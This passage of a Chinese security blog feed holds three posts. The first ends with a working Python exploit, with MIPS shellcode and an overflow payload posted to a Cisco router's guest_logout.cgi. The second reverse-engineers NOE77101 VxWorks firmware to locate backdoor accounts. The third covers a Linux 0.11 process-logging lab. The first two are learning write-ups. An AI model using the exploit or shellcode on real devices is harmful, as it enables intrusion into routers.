class="string">&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line">pd1 = <span class="string">&quot;status_guestnet.asp&quot;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">49</span> + \</span><br><span class="line">    p32(jmp_a0) + <span class="string">&#x27;b&#x27;</span> * (<span class="number">85</span> - <span class="number">49</span> - <span class="number">4</span>) + p32(jmp_s0) + <span class="string">&#x27;c&#x27;</span> * <span class="number">0x18</span> + shellcode</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://10.10.10.1/guest_logout.cgi&quot;</span></span><br><span class="line">pd2 = &#123;</span><br><span class="line">    <span class="string">&quot;cmac&quot;</span>: <span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit_button&quot;</span>: pd1,</span><br><span class="line">    <span class="string">&quot;cip&quot;</span>: <span class="string">&quot;192.168.1.100&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line">requests.post(url, data=pd2, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/01/5ciSTlNtBKLXjxP.png" alt=""></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/">https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/</a></p><p><a href="https://www.anquanke.com/post/id/224301#h3-7">https://www.anquanke.com/post/id/224301#h3-7</a></p><p><a href="https://www.somd5.com/">https://www.somd5.com/</a></p><p><a href="https://github.com/firmianay/IoT-vulhub/tree/master/Cisco/CVE-2020-3331">https://github.com/firmianay/IoT-vulhub/tree/master/Cisco/CVE-2020-3331</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/mips/rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/mips/rop/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> iot </tag>
            
            <tag> real world </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NOE77101 vxworks后门账户分析</title>
      <link href="2021/08/25/iot-NOE7701/"/>
      <url>2021/08/25/iot-NOE7701/</url>
      
        <content type="html"><![CDATA[<p>昨天刚听了轩神在HWS开的第一堂iot入门课程，今天想着找个固件来分析一下练练手<br>本人对于iot完全小白，参考了诸多文章来分析此固件<br>固件下载地址：<a href="https://github.com/ameng929/NOE77101_Firmware/blob/master/FLASH0/wwwroot/conf/exec/NOE77101.bin">https://github.com/ameng929/NOE77101_Firmware/blob/master/FLASH0/wwwroot/conf/exec/NOE77101.bin</a></p><h2 id="固件逆向分析"><a href="#固件逆向分析" class="headerlink" title="固件逆向分析"></a>固件逆向分析</h2><h3 id="固件识别与解压"><a href="#固件识别与解压" class="headerlink" title="固件识别与解压"></a>固件识别与解压</h3><p>binwalk 分析文件，发现是zlib压缩文件<br><img src="https://i.loli.net/2021/08/25/8QOcELFA3KPG15p.png" alt=""></p><p>binwalk -e 分离文件后，对分离出的文件分析</p><p><img src="https://i.loli.net/2021/08/25/QadSAt4MHOrp2EZ.png" alt=""><br>固件的符号表位于0x301E74，操作系统为VxWorks 2.5</p><p><img src="https://i.loli.net/2021/08/25/iHhbnyd3VRGQJzK.png" alt="binwalk3.png"></p><p>确定CPU架构为PowerPC big endian</p><h3 id="确定固件内存加载地址"><a href="#确定固件内存加载地址" class="headerlink" title="确定固件内存加载地址"></a>确定固件内存加载地址</h3><p>嵌入式系统固件需要加载到内存中特定位置运行，这个特定位置就是固件加载地址<br><strong>固件加载地址 = 符号表中字符串的地址 - 相应字符串在固件中的偏移</strong><br>嵌入式系统固件的函数调用地址是基于固件加载地址所计算出的内存位置，而不是固件中的地址</p><p>我们找到了符号表的地址，VxWorks系列的符号表的组织规则，以16个字节为一组数据，前四个字节是0x00，之后四个字节是符号名字符串所在的内存地址，后四个是符号所在的内存地址，最后四个是符号的类型<br><img src="https://i.loli.net/2021/08/26/Wi1MIhAySxHGCqF.png" alt=""></p><p>根据符号表找到字符串附近，然后在附近找字符串，我们需要找到最后一个字符串所在的地址，因为字符串表中的最后一个字符串在符号表中第一个被引用，我们需要使用字符串在内存中的地址减去在文件中的地址就能得到内存加载地址，最后一个字符串是APP_STATION_MODBUS<br><img src="https://i.loli.net/2021/08/26/tmG2VUJTOgP9iq3.png" alt=""></p><p>内存加载地址 = 0x27656C - 0x26656C = 0x10000</p><h3 id="修复函数名"><a href="#修复函数名" class="headerlink" title="修复函数名"></a>修复函数名</h3><p>找到符号表的结束地址：<br><img src="https://i.loli.net/2021/08/26/heXT8WNQU29wrPb.png" alt="010-3.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">loadaddress = <span class="number">0x10000</span> <span class="comment">#加载地址</span></span><br><span class="line">eaStart = <span class="number">0x301e64</span> + loadaddress<span class="comment">#符号表起始地址</span></span><br><span class="line">eaEnd = <span class="number">0x3293b4</span> + loadaddress<span class="comment">#符号表结束地址</span></span><br><span class="line"> </span><br><span class="line">ea = eaStart</span><br><span class="line">eaEnd = eaEnd</span><br><span class="line"><span class="keyword">while</span> ea &lt; eaEnd:</span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    create_strlit(idc.get_wide_dword(ea - offset), BADADDR)</span><br><span class="line">    sName = get_strlit_contents(idc.get_wide_dword(ea - offset))</span><br><span class="line">    print(sName)</span><br><span class="line">    <span class="comment">#如果函数名不为空</span></span><br><span class="line">    <span class="keyword">if</span> sName:</span><br><span class="line">        sName = <span class="built_in">str</span>(sName)</span><br><span class="line">    <span class="comment">#获取函数地址</span></span><br><span class="line">        eaFunc = idc.get_wide_dword(ea - offset + <span class="number">4</span>)</span><br><span class="line">        <span class="comment">#重命名地址，将函数地址与函数名对应</span></span><br><span class="line">        print(<span class="built_in">type</span>(sName))</span><br><span class="line">        set_name(eaFunc, sName, SN_NOWARN)</span><br><span class="line">        <span class="comment">#分析指定地址代码区</span></span><br><span class="line">        create_insn(eaFunc)</span><br><span class="line">        <span class="comment">#设置函数始末地址</span></span><br><span class="line">        add_func(eaFunc, BADADDR)</span><br><span class="line">    <span class="comment">#每次叠加16字节，每条符号表记录占16个字节</span></span><br><span class="line">    ea = ea + <span class="number">16</span></span><br></pre></td></tr></table></figure><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>VxWorks的启动代码usrInit分析<br>这个函数是在ram中执行的第一个函数，主要完成对bss段的清除、设置异常向量、然后调用sysHwinit()初始化硬件，VxWorks固件自身有三个section，text，data和bss，所以根据usrinit首先会处理bss段，可以找到bss段的地址进而计算出固件的加载地址（跑题了，这是根据别的文章提一句），usrKernelInit()会初始化系统内核，然后做cache相关的操作，接下来会创建第一个任务usrRoot</p><p>整个调用关系<code>_sysinit -&gt; usrInit -&gt; usrKernelInit -&gt; usrRoot -&gt; usrAppInit</code></p><p><img src="https://i.loli.net/2021/08/26/Yc36jsGPJul7V2B.png" alt=""></p><p>在这里发现多次调用添加账户的function，然后根据这个就能摸到多个后门账户和密码。<br><img src="https://i.loli.net/2021/08/26/D1Zk7UmHTocXrxN.png" alt=""></p><p><img src="https://i.loli.net/2021/08/26/MuvYWT9pCnRJDXU.png" alt=""></p><p>总结一下，还有很多地方不懂，比如这种架构的指令集，VxWorks的一些知识，一些细节问题，比如符号表的开始地址和结束地址确定，一开始是010editor中的地址，后来啥也出不来，就往后移动了四个字节，才显示出修复的函数名，idapython的用法，以及符号表中的第一项对应APP_STATION_MODBUS。</p><p>总之，听了剑锋老师的话，还是要多积累经验，毕竟当初栈溢出ret2text的时候也不懂啥是plt和got（笑</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>工控漏洞挖掘方法之固件逆向分析：<a href="https://paper.seebug.org/613/#22noe-771">https://paper.seebug.org/613/#22noe-771</a></p><p>施耐德 NOE771 后门分析：<a href="https://p1kk.github.io/2021/06/11/iot/%E6%96%BD%E8%80%90%E5%BE%B7%20NOE771/">https://p1kk.github.io/2021/06/11/iot/%E6%96%BD%E8%80%90%E5%BE%B7%20NOE771/</a></p><p>施耐德PLC以太网模块固件NOE77101后门账户漏洞：<a href="https://blog.csdn.net/weixin_43815930/article/details/107646507">https://blog.csdn.net/weixin_43815930/article/details/107646507</a></p><p>NOE77101 vxworks后门账户分析：<a href="http://www.atomsec.org/iot/noe77101-vxworks%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E5%88%86%E6%9E%90/">http://www.atomsec.org/iot/noe77101-vxworks%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E5%88%86%E6%9E%90/</a></p><p>基于 VxWorks 的嵌入式设备固件分析方法介绍：<a href="https://paper.seebug.org/771/#1">https://paper.seebug.org/771/#1</a></p><p>VxWorks启动代码usrInit()函数分析：<a href="https://blog.csdn.net/yinyansiniye/article/details/41926723">https://blog.csdn.net/yinyansiniye/article/details/41926723</a></p><p>Porting from IDAPython 6.x-7.3, to 7.4：<a href="https://hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">https://hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HIT-OSlab3</title>
      <link href="2021/08/22/HIT-OSlab3/"/>
      <url>2021/08/22/HIT-OSlab3/</url>
      
        <content type="html"><![CDATA[<p>在借助linux0.11内核代码剖析，别人的实验代码，以及操作系统原理实现与实践下完成QAQ</p><h2 id="process-c"><a href="#process-c" class="headerlink" title="process.c"></a>process.c</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/times.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HZ100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHILD_PROCESS_NUM   10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpuio_bound</span><span class="params">(<span class="keyword">int</span> last, <span class="keyword">int</span> cpu_time, <span class="keyword">int</span> io_time)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> c_pr[CHILD_PROCESS_NUM];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; CHILD_PROCESS_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        c_pr[i] = fork();</span><br><span class="line">        <span class="keyword">if</span>(c_pr[i] == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// child process</span></span><br><span class="line">            cpuio_bound(<span class="number">20</span>, <span class="number">2</span> * i, <span class="number">20</span> - <span class="number">2</span> * i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;   <span class="comment">// 执行完cpuio_bound 结束子进程</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(c_pr[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Child process %d failed to fork!\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; CHILD_PROCESS_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Child Process ID:%d\n&quot;</span>, c_pr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    wait();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 此函数按照参数占用CPU和I/O时间</span></span><br><span class="line"><span class="comment"> * last: 函数实际占用CPU和I/O的总时间，不含在就绪队列中的时间，&gt;=0是必须的</span></span><br><span class="line"><span class="comment"> * cpu_time: 一次连续占用CPU的时间，&gt;=0是必须的</span></span><br><span class="line"><span class="comment"> * io_time: 一次I/O消耗的时间，&gt;=0是必须的</span></span><br><span class="line"><span class="comment"> * 如果last &gt; cpu_time + io_time，则往复多次占用CPU和I/O</span></span><br><span class="line"><span class="comment"> * 所有时间的单位为秒</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpuio_bound</span><span class="params">(<span class="keyword">int</span> last, <span class="keyword">int</span> cpu_time, <span class="keyword">int</span> io_time)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tms</span> <span class="title">start_time</span>, <span class="title">current_time</span>;</span></span><br><span class="line"><span class="keyword">clock_t</span> utime, stime;</span><br><span class="line"><span class="keyword">int</span> sleep_time;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (last &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* CPU Burst */</span></span><br><span class="line">times(&amp;start_time);</span><br><span class="line"><span class="comment">/* 其实只有t.tms_utime才是真正的CPU时间。但我们是在模拟一个</span></span><br><span class="line"><span class="comment"> * 只在用户状态运行的CPU大户，就像“for(;;);”。所以把t.tms_stime</span></span><br><span class="line"><span class="comment"> * 加上很合理。*/</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">times(&amp;current_time);</span><br><span class="line">utime = current_time.tms_utime - start_time.tms_utime;</span><br><span class="line">stime = current_time.tms_stime - start_time.tms_stime;</span><br><span class="line">&#125; <span class="keyword">while</span> ( ( (utime + stime) / HZ )  &lt; cpu_time );</span><br><span class="line">last -= cpu_time;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (last &lt;= <span class="number">0</span> )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* IO Burst */</span></span><br><span class="line"><span class="comment">/* 用sleep(1)模拟1秒钟的I/O操作 */</span></span><br><span class="line">sleep_time=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (sleep_time &lt; io_time)</span><br><span class="line">&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">sleep_time++;</span><br><span class="line">&#125;</span><br><span class="line">last -= sleep_time;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a>main.c</h2><p>内核状态下只能用printk，根据老师的代码增加fprintk函数，在github上有相关的resource，遂不再记录<br>因为要早早的开始记录日志文件，所以在进程0开始在用户态执行以后就打开日志文件，开启了多进程视图，这个时间点就在move_to_user_mode()之后，但是还要先挂载上文件系统才能记录。<br>关键代码如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">setup((<span class="keyword">void</span> *) &amp;drive_info);</span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">&quot;/dev/tty0&quot;</span>,O_RDWR,<span class="number">0</span>);    <span class="comment">// 完成了文件系统加载</span></span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);        </span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);        </span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">&quot;/var/process.log&quot;</span>,O_CREAT|O_TRUNC|O_WRONLY,<span class="number">0666</span>);</span><br></pre></td></tr></table></figure></p><h2 id="fork-c"><a href="#fork-c" class="headerlink" title="fork.c"></a>fork.c</h2><p>完成多进程日志记录最重要的就是找到内核中关于进程状态代码的切换点，然后添加相关代码完成记录。<br>fork首先是新建进程的地方，这个地方肯定要记录，真正实现进程创建的函数是copy_process()函数，完成pcb相关设置后将进程状态设置为就绪，即p-&gt;state = TASK_RUNNING，这里就要向日志文件写相关记录，分别是新建和记录（其实不难发现，所有应该添加的代码，都应该围绕p-&gt;state这种状态设置代码来完成）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%ld\t%c\t%ld\n&quot;</span>, p-&gt;pid, <span class="string">&#x27;N&#x27;</span>, jiffies);</span><br><span class="line">p-&gt;state = TASK_RUNNING;<span class="comment">/* do this last, just in case */</span></span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%ld\t%c\t%ld\n&quot;</span>, p-&gt;pid, <span class="string">&#x27;J&#x27;</span>, jiffies);</span><br></pre></td></tr></table></figure><h2 id="sched-c"><a href="#sched-c" class="headerlink" title="sched.c"></a>sched.c</h2><p>sched.c是内核中有有关进程调度管理的程序，其中包括有关调度的基本函数sleep_on()，wakeup()，schedule()等。<br>要做出修改的函数有schedule(),sys_pause(),sleep_on(),interruptible_sleep_on(),wake_up()函数<br>为了方便直接贴出所有代码（懒）<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">schedule</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,next,c;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check alarm, wake up any interruptible tasks that have got a signal */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line"><span class="keyword">if</span> (*p) &#123;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;alarm &amp;&amp; (*p)-&gt;alarm &lt; jiffies) &#123;</span><br><span class="line">(*p)-&gt;signal |= (<span class="number">1</span>&lt;&lt;(SIGALRM<span class="number">-1</span>));</span><br><span class="line">(*p)-&gt;alarm = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (((*p)-&gt;signal &amp; ~(_BLOCKABLE &amp; (*p)-&gt;blocked)) &amp;&amp;</span><br><span class="line">(*p)-&gt;state==TASK_INTERRUPTIBLE)</span><br><span class="line">&#123;</span><br><span class="line">(*p)-&gt;state=TASK_RUNNING;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, (*p)-&gt;pid, jiffies);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* this is the scheduler proper: */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">c = <span class="number">-1</span>;</span><br><span class="line">next = <span class="number">0</span>;</span><br><span class="line">i = NR_TASKS;</span><br><span class="line">p = &amp;task[NR_TASKS];</span><br><span class="line"><span class="keyword">while</span> (--i) &#123;</span><br><span class="line"><span class="keyword">if</span> (!*--p)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;state == TASK_RUNNING &amp;&amp; (*p)-&gt;counter &gt; c)</span><br><span class="line">c = (*p)-&gt;counter, next = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line"><span class="keyword">if</span> (*p)</span><br><span class="line">(*p)-&gt;counter = ((*p)-&gt;counter &gt;&gt; <span class="number">1</span>) +</span><br><span class="line">(*p)-&gt;priority;</span><br><span class="line"><span class="keyword">if</span>(current-&gt;pid != task[next]-&gt;pid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(current-&gt;state == TASK_RUNNING)</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tR\t%d\n&quot;</span>, task[next]-&gt;pid, jiffies);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">switch_to(next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_pause</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">current-&gt;state = TASK_INTERRUPTIBLE;</span><br><span class="line"><span class="keyword">if</span>(current-&gt;pid != <span class="number">0</span>)</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tW\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sleep_on</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (current == &amp;(init_task.task))</span><br><span class="line">panic(<span class="string">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class="line">tmp = *p;</span><br><span class="line">*p = current;</span><br><span class="line">current-&gt;state = TASK_UNINTERRUPTIBLE;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tW\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">if</span> (tmp)</span><br><span class="line">&#123;</span><br><span class="line">tmp-&gt;state=<span class="number">0</span>;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, tmp-&gt;pid, jiffies);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interruptible_sleep_on</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (current == &amp;(init_task.task))</span><br><span class="line">panic(<span class="string">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class="line">tmp=*p;</span><br><span class="line">*p=current;</span><br><span class="line">repeat:current-&gt;state = TASK_INTERRUPTIBLE;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tW\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">if</span> (*p &amp;&amp; *p != current) &#123;</span><br><span class="line">(**p).state=<span class="number">0</span>;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, (*p)-&gt;pid, jiffies);</span><br><span class="line"><span class="keyword">goto</span> repeat;</span><br><span class="line">&#125;</span><br><span class="line">*p=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (tmp)</span><br><span class="line">&#123;</span><br><span class="line">tmp-&gt;state=<span class="number">0</span>;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, tmp-&gt;pid, jiffies);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wake_up</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (p &amp;&amp; *p) &#123;</span><br><span class="line">(**p).state=<span class="number">0</span>;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, (*p)-&gt;pid, jiffies);</span><br><span class="line">*p=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="exit-c"><a href="#exit-c" class="headerlink" title="exit.c"></a>exit.c</h2><p>修改do_exit和sys_waitpid<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_exit</span><span class="params">(<span class="keyword">long</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">free_page_tables(get_base(current-&gt;ldt[<span class="number">1</span>]),get_limit(<span class="number">0x0f</span>));</span><br><span class="line">free_page_tables(get_base(current-&gt;ldt[<span class="number">2</span>]),get_limit(<span class="number">0x17</span>));</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;NR_TASKS ; i++)</span><br><span class="line"><span class="keyword">if</span> (task[i] &amp;&amp; task[i]-&gt;father == current-&gt;pid) &#123;</span><br><span class="line">task[i]-&gt;father = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (task[i]-&gt;state == TASK_ZOMBIE)</span><br><span class="line"><span class="comment">/* assumption task[1] is always init */</span></span><br><span class="line">(<span class="keyword">void</span>) send_sig(SIGCHLD, task[<span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;NR_OPEN ; i++)</span><br><span class="line"><span class="keyword">if</span> (current-&gt;filp[i])</span><br><span class="line">sys_close(i);</span><br><span class="line">iput(current-&gt;pwd);</span><br><span class="line">current-&gt;pwd=<span class="literal">NULL</span>;</span><br><span class="line">iput(current-&gt;root);</span><br><span class="line">current-&gt;root=<span class="literal">NULL</span>;</span><br><span class="line">iput(current-&gt;executable);</span><br><span class="line">current-&gt;executable=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;leader &amp;&amp; current-&gt;tty &gt;= <span class="number">0</span>)</span><br><span class="line">tty_table[current-&gt;tty].pgrp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (last_task_used_math == current)</span><br><span class="line">last_task_used_math = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;leader)</span><br><span class="line">kill_session();</span><br><span class="line">current-&gt;state = TASK_ZOMBIE;</span><br><span class="line">current-&gt;exit_code = code;</span><br><span class="line">tell_father(current-&gt;father);</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tE\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">return</span> (<span class="number">-1</span>);<span class="comment">/* just to suppress warnings */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">unsigned</span> <span class="keyword">long</span> * stat_addr, <span class="keyword">int</span> options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag, code;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">verify_area(stat_addr,<span class="number">4</span>);</span><br><span class="line">repeat:</span><br><span class="line">flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p) &#123;</span><br><span 